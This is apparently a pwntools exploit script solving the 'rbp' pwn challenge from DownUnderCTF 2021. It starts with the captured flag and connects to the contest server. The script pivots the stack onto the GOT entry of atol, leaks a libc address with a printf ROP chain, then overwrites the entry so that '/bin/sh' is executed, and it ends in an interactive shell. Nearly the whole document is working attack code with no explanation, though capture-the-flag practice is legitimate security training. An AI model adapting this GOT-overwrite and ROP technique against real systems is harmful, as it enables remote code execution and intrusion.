#DUCTF{n0_0verfl0w?_n0_pr0bl3m!}
from pwn import *

elf = ELF("./rbp")
ld = ELF("./ld-2.33.so")
libc = ELF("./libc.so.6")

#target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote("pwn-2021.duc.tf", 31910)

def s(d):
	target.send(d)


s(p64(elf.got['atol'] + 0x20) + p64(elf.sym['main'] + 1) + "A"*8)

#gdb.attach(target, 'b *0x00401247\nc\ntelescope $rsp-0x20 20')

s(str( - 0x20 ).ljust(0x13, "a"))

pop_rdi = p64(0x00000000004012b3)
pop_rbp = p64(0x000000000040114d)

s(pop_rdi + p64(elf.got['atol']) + p64(elf.plt['printf']))
s(str( - 0x28 ).ljust(0x13, "b"))

target.recvuntil("number? ")
target.recvuntil("number? ")
libc_base = u64(target.recv(6).ljust(8, '\x00')) - libc.sym['atol']
log.info("LIBC Base: " + hex(libc_base))

s(pop_rbp + p64(elf.got['atol'] + 0x20 - 8) + p64(0x004011b1))
s(str( - 0x28 ).ljust(0x13, "b"))

#gdb.attach(target, 'b system')

s("/bin/sh\x00" + p64(libc_base + 0x7f887e68c4a2 - 0x00007f887e63d000))
#s("/bin/sh\x00" + p64(libc_base + libc.sym['system']))

target.interactive()